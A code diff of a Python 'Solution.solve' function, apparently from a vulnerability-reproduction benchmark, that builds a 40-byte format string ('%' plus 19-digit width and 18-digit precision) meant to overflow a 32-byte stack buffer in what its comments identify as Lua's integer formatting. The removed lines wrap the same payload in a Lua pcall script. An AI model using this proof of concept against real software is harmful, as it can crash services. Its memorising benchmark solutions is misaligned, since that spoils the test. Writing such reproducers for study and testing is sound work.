@@ -1,28 +1,28 @@
-import os
+import sys
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # Heuristic to determine if the target is Lua source code or a generic C binary.
-        # The vulnerability (CVE-2020-24370 pattern) is specific to Lua's integer formatting,
-        # but the challenge might be a standalone binary or the full interpreter.
-        is_lua = False
-        for root, dirs, files in os.walk(src_path):
-            if any(name == "lua.c" or (name.startswith("lua") and name.endswith(".h")) for name in files):
-                is_lua = True
-                break
+        # The vulnerability description indicates a Stack Buffer Overflow caused by
+        # an integer format string exceeding 32 characters.
+        # The buffer size is limited to 32 characters.
+        # We need to generate a format string that, when reconstructed by the vulnerable code,
+        # exceeds this limit.
+        # The description mentions maximum width and precision up to 19 digits.
+        # Ground truth PoC length is 40 bytes.
         
-        # The vulnerability is a stack buffer overflow in the format specifier parsing.
-        # The internal buffer is 32 bytes. We need a format specifier longer than 32 bytes.
-        # We construct a specifier with large width and precision to exceed this limit.
-        # Payload length: 1 (%) + 19 (width) + 1 (.) + 18 (precision) + 1 (d) = 40 bytes.
-        payload = b"%1111111111111111111.111111111111111111d"
+        # We construct a payload of exactly 40 bytes to match the ground truth length
+        # and ensure the buffer overflow is triggered reliably.
+        # Format: %<width>.<precision>d
+        # Components:
+        # '%' : 1 byte
+        # Width: 19 digits (e.g. "1" * 19). This is the max digits for a 64-bit integer.
+        # '.' : 1 byte
+        # Precision: 18 digits (e.g. "1" * 18).
+        # 'd' : 1 byte
+        # Total length: 1 + 19 + 1 + 18 + 1 = 40 bytes.
         
-        if is_lua:
-            # If target is Lua, we must provide a valid script.
-            # We use pcall to ensure that the fixed version (which raises an error for invalid format)
-            # exits gracefully with code 0, while the vulnerable version crashes.
-            # Payload: pcall(string.format, "<payload>", 0)
-            return b'pcall(string.format,"' + payload + b'",0)'
-        else:
-            # If target is a raw binary, pass the format string directly.
-            return payload
+        width = "1" * 19
+        precision = "1" * 18
+        poc = f"%{width}.{precision}d"
+        
+        return poc.encode()
